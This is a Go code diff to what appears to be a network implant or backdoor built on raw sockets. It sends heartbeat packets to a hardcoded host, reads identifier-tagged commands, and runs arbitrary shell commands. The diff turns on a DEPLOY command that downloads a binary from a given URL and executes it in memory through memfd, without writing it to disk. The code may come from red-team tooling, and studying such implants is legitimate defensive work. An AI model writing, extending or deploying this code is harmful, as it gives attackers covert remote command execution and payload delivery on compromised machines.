@@ -13,6 +13,7 @@ import (
 	"net"
 	"os/exec"
 	"psovaya/pkg/dropper"
+	"psovaya/pkg/rawsocket"
 	"strings"
 	"time"
 
@@ -40,7 +41,13 @@ func generateHeartbeat(iface *net.Interface, src net.IP, dst net.IP, dstMAC net.
 		fd := cattails.NewSocket()
 		defer unix.Close(fd)
 
-		packet := cattails.CreatePacket(iface, src, dst, 18000, 58000, dstMAC, cattails.CreateHello(iface.HardwareAddr, src))
+		// Create Cmd -> Encrypt -> Wrap with Identifier
+		data := cattails.CreateHello(iface.HardwareAddr, src)
+		// data = xorData(data)
+		data = rawsocket.AddIdentifier(data)
+
+		// Send Packet
+		packet := cattails.CreatePacket(iface, src, dst, 18000, 58000, dstMAC, data)
 		addr := cattails.CreateAddrStruct(iface)
 		cattails.SendPacket(fd, iface, addr, packet)
 
@@ -58,8 +65,8 @@ func dropBinary(url string, procname string) {
 	dropper.ExecMemfd(fd, procname)
 }
 
-func implantProcessPacket(packet gopacket.Packet, target bool, hostIP net.IP) {
-	data := string(packet.ApplicationLayer().Payload())
+func implantProcessPacket(packet gopacket.Packet, hostIP net.IP) {
+	data := rawsocket.RemoveIdentifier(string(packet.ApplicationLayer().Payload()))
 	data = strings.Trim(data, "\n")
 
 	// Split into list to get command and args
@@ -73,7 +80,7 @@ func implantProcessPacket(packet gopacket.Packet, target bool, hostIP net.IP) {
 		command := strings.Join(payload[1:], " ")
 		execCommand(command)
 	case "DEPLOY":
-		fmt.Println("Deploy Binary")
+		dropBinary(payload[1], payload[2])
 	}
 }
 
@@ -116,9 +123,9 @@ func main() {
 	go generateHeartbeat(iface, src, net.IPv4(192, 168, 1, 174), dstMAC)
 
 	for {
-		packet, target := cattails.BotReadPacket(readfd, vm)
+		packet := rawsocket.BothReadPacket(readfd, vm)
 		if packet != nil {
-			go implantProcessPacket(packet, target, src)
+			go implantProcessPacket(packet, src)
 		}
 	}
 
